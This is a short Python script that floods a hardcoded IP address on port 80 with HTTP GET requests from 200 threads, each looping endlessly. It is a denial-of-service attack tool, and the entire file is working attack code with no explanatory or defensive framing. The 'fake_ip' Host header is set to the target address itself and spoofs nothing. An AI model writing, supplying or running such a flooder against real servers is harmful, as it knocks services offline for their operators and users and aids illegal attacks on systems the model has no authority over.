import socket
import threading

target_ip = "81.220.52.44"
target_port = 80
fake_ip = "81.220.52.44"

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

for i in range(200):
    thread = threading.Thread(target=attack)
    thread.start()
